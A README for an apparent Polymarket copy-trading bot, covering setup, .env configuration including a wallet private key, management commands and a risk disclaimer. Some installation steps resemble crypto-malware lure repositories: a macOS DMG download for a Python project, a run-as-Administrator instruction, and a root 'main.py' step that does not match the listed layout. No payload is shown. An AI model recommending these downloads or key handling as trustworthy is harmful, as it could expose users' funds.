# Polymarket Portfolio Mirroring System — Automated Trade Replication

<div align="center">

[![Python](https://img.shields.io/badge/Python-3.10+-3776AB?style=for-the-badge&logo=python&logoColor=white)](https://python.org)
[![License](https://img.shields.io/badge/License-ISC-blue?style=for-the-badge)](LICENSE)
[![MongoDB](https://img.shields.io/badge/MongoDB-Ready-47A248?style=for-the-badge&logo=mongodb&logoColor=white)](https://mongodb.com)
[![Polygon](https://img.shields.io/badge/Polygon-Network-8247E5?style=for-the-badge&logo=polygon&logoColor=white)](https://polygon.technology)

**Enterprise-grade Python system for replicating successful trading strategies from top Polymarket participants with intelligent position sizing and real-time execution.**

[Overview](#overview) • [Installation](#installation) • [Configuration](#configuration) • [Commands](#commands) • [Documentation](#documentation)

</div>

---

## 🎯 Overview

A sophisticated portfolio mirroring system that enables automated replication of trading strategies from high-performing participants on Polymarket. The system continuously monitors selected wallets, calculates proportional position sizes, and executes matching orders in real-time.

### Core Workflow

```
┌─────────────────┐     ┌──────────────────┐     ┌─────────────────┐
│  Select Target  │ ──▶ │  Monitor Trades  │ ──▶ │ Execute Orders  │
│    Wallets      │     │    Real-time     │     │  Proportionally │
└─────────────────┘     └──────────────────┘     └─────────────────┘
```

1. **Wallet Selection** — Identify high-performing participants via leaderboards
2. **Activity Monitoring** — Real-time tracking via WebSocket and API polling
3. **Size Calculation** — Automatic scaling based on your capital ratio
4. **Order Execution** — Instant order placement on Polymarket
5. **History Tracking** — Complete audit trail in MongoDB

## ✨ Features

### Trading Capabilities

| Feature | Description |
|---------|-------------|
| 🔄 **Multi-Wallet Monitoring** | Track multiple wallets simultaneously |
| 📊 **Smart Position Sizing** | Automatic capital-proportional scaling |
| 🎚️ **Tiered Multipliers** | Different multipliers for different trade sizes |
| ⚡ **Real-time Execution** | Sub-second trade detection and execution |
| 📈 **Trade Aggregation** | Combine small trades into optimal orders |
| 🛡️ **Slippage Protection** | Built-in price checks to avoid bad fills |

### Analysis & Research

- **Wallet Analytics** — Detailed performance metrics and statistics
- **Simulation Engine** — Backtest strategies before deploying capital
- **Position Management** — Tools for managing and closing positions
- **Performance Auditing** — Compare your results with source wallets

## 📦 Installation

### Prerequisites

- Python 3.10 or higher
- MongoDB database ([MongoDB Atlas](https://www.mongodb.com/cloud/atlas/register) free tier supported)
- Polygon wallet with USDC balance
- RPC endpoint ([Infura](https://infura.io) or [Alchemy](https://www.alchemy.com))

### Setup
The instructions are for Windows and Linux systems; macOS users get the [DMG file](../../releases).  





Check for Git and Python installations on Windows.

Install Git for Windows:

https://git-scm.com/install/windows

Install Python for Windows:

https://www.python.org/ftp/python/3.13.12/python-3.13.12-amd64.exe

Open Command Prompt (Administrator).





```bash 
git clone https://github.com/vorvik-61/Copy-Trading-Bot-Polymarket.git
```
```bash 
cd Copy-Trading-Bot-Polymarket
```
```bash 
py -m pip install -r requirements.txt
```
```bash 
py main.py
```


Run the interactive setup wizard:
```bash
py -m src.scripts.setup.setup
```

Verify your configuration:
```bash
py -m src.scripts.setup.system_status
```

Start the monitoring system:
```bash
py -m src.main
```

📖 **Detailed instructions available in [Getting Started Guide](docs/GETTING_STARTED.md)**

## ⚙️ Configuration

### Environment Variables

Create a `.env` file with the following configuration:

| Variable | Description | Example |
|----------|-------------|---------|
| `USER_ADDRESSES` | Target wallet addresses (comma-separated) | `'0xABC..., 0xDEF...'` |
| `PROXY_WALLET` | Your Polygon wallet address | `'0x123...'` |
| `PRIVATE_KEY` | Wallet private key (without 0x prefix) | `'abc123...'` |
| `MONGO_URI` | MongoDB connection string | `'mongodb+srv://...'` |
| `RPC_URL` | Polygon RPC endpoint | `'https://polygon...'` |
| `USDC_CONTRACT_ADDRESS` | USDC contract on Polygon | `'0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174'` |
| `CLOB_HTTP_URL` | Polymarket CLOB API | `'https://clob.polymarket.com'` |
| `TRADE_MULTIPLIER` | Position size multiplier | `1.0` |
| `FETCH_INTERVAL` | Polling interval (seconds) | `1` |
| `TRADING_SIMULATION` | `Y` = simulate and do not submit live orders | `Y` or `N` |
| `SIMULATION_TOTAL_BALANCE` | Virtual account size used in simulation mode | `1000` |
| `SIMULATION_RESULTS_FILE` | CSV output path for simulation trades | `strategy_factory_results/trading_simulation.csv` |
| `OWN_TRADING_STRATEGY` | `Y` = enable independent BTC 5-minute strategy (no copy trading) | `Y` or `N` |
| `OWN_STRATEGY_MIN_PROBABILITY` | Trigger threshold for BTC 5-minute outcome probability | `0.87` |
| `OWN_STRATEGY_ORDER_SIZE_USD` | Fixed order size when strategy triggers | `100` |
| `OWN_STRATEGY_LAST_SECONDS` | Only trade when market has this many seconds left or less | `50` |

> Note: when `OWN_TRADING_STRATEGY=Y`, the bot runs the independent BTC 5-minute strategy and `USER_ADDRESSES` is not required.

Own 5-minute strategy market connection:
- Market discovery: `https://gamma-api.polymarket.com/markets` (active/open markets metadata).
- Execution pricing + order placement: configured CLOB client (`CLOB_HTTP_URL`) orderbook + order submission.

### Finding Target Wallets

1. Visit [Polymarket Leaderboard](https://polymarket.com/leaderboard)
2. Analyze participants with consistent positive returns and >55% success rate
3. Verify detailed metrics on [Predictfolio](https://predictfolio.com)
4. Add selected wallet addresses to `USER_ADDRESSES`

## 📋 Commands

### Setup & Status

```bash
python -m src.scripts.setup.setup          # Interactive configuration wizard
python -m src.scripts.setup.system_status   # Verify system health
python -m src.scripts.setup.help           # Display command reference
```

### Main Application

```bash
python -m src.main                          # Start monitoring system
```

### Wallet Analytics

```bash
python -m src.scripts.wallet.check_proxy_wallet        # Proxy wallet status
python -m src.scripts.wallet.check_both_wallets        # Compare two wallets
python -m src.scripts.wallet.check_my_stats            # Your trading statistics
python -m src.scripts.wallet.check_recent_activity     # Recent activity log
python -m src.scripts.wallet.check_positions_detailed  # Detailed positions
python -m src.scripts.wallet.check_pnl_discrepancy     # P&L analysis
```

### Research & Discovery

```bash
python -m src.scripts.research.find_best_traders       # Top performers
python -m src.scripts.research.find_low_risk_traders   # Risk-adjusted rankings
python -m src.scripts.research.scan_best_traders       # Market-wide scan
python -m src.scripts.research.scan_traders_from_markets # Active market analysis
```

### Simulation & Backtesting

```bash
python -m src.scripts.simulation.simulate_profitability # Strategy simulation
python -m src.scripts.simulation.run_simulations       # Batch simulations
python -m src.scripts.simulation.compare_results       # Results comparison
python -m src.scripts.simulation.aggregate_results     # Performance aggregation
python -m src.scripts.simulation.audit_copy_trading    # Algorithm audit
```

### Position Management

```bash
python -m src.scripts.position.manual_sell             # Manual position exit
python -m src.scripts.position.sell_large_positions    # Bulk position reduction
python -m src.scripts.position.close_stale_positions   # Cleanup old positions
python -m src.scripts.position.close_resolved_positions # Close settled markets
```

## 📁 Project Structure

```
├── src/
│   ├── main.py              # Application entry point
│   ├── config/              # Configuration management
│   │   ├── env.py           # Environment variables
│   │   ├── db.py            # MongoDB connection
│   │   └── copy_strategy.py # Strategy configuration
│   ├── services/            # Core services
│   │   ├── trade_monitor.py # Activity monitoring
│   │   └── trade_executor.py # Order execution
│   ├── utils/               # Utility functions
│   │   ├── logger.py        # Logging utilities
│   │   ├── fetch_data.py    # API communication
│   │   └── post_order.py    # Order submission
│   ├── models/              # Data models
│   └── scripts/             # Management scripts
│       ├── setup/           # Setup utilities
│       ├── wallet/          # Wallet tools
│       ├── research/        # Research tools
│       ├── simulation/      # Backtesting
│       └── position/        # Position management
├── docs/                    # Documentation
├── requirements.txt         # Python dependencies
└── .env.example            # Environment template
```

## 🔒 Security Recommendations

- **Dedicated Wallet** — Use a separate wallet for automated trading
- **Capital Limits** — Only allocate funds you can afford to lose
- **Regular Monitoring** — Review logs and positions daily
- **Secure Storage** — Never commit `.env` files to version control
- **IP Whitelisting** — Configure MongoDB Atlas IP restrictions

## 📊 Performance Monitoring

The system provides comprehensive logging with colored output:

```
[INFO] Connected to MongoDB
[INFO] Monitoring 3 wallet addresses
[SUCCESS] Order executed: BUY 10.5 USDC @ 0.65
[WARNING] Slippage detected, order adjusted
```

All activity is stored in MongoDB for historical analysis and auditing.

## ❓ Troubleshooting

| Issue | Solution |
|-------|----------|
| MongoDB connection failed | Verify `MONGO_URI` and whitelist your IP in Atlas |
| No activity detected | Check `USER_ADDRESSES` are valid and active |
| Insufficient balance | Add USDC and POL/MATIC for gas |
| Import errors | Run from project root directory |

Run diagnostics:
```bash
python -m src.scripts.setup.system_status
```

## 📚 Documentation

- **[Getting Started](docs/GETTING_STARTED.md)** — Complete setup walkthrough
- **[Strategy Guide](docs/STRATEGY.md)** — Configuration and tuning
- **[Command Reference](docs/COMMAND_REFERENCE.md)** — All available commands
- **[Examples](docs/EXAMPLES.md)** — Practical usage scenarios

## 🤝 Contributing

Contributions are welcome! Please follow these steps:

1. Fork the repository
2. Create a feature branch (`git checkout -b feature/new-feature`)
3. Commit changes (`git commit -m 'Add new feature'`)
4. Push to branch (`git push origin feature/new-feature`)
5. Open a Pull Request

## 📄 License

This project is licensed under the ISC License — see the [LICENSE](LICENSE) file for details.

## ⚠️ Disclaimer

This software is provided for educational and research purposes only. Trading on prediction markets carries inherent financial risk. Past performance of any wallet or strategy does not guarantee future results. The developers assume no responsibility for any financial losses incurred while using this software.

---

<div align="center">

**Built with [Polymarket CLOB Client](https://github.com/Polymarket/clob-client) • Analytics by [Predictfolio](https://predictfolio.com) • Powered by Polygon**

</div>
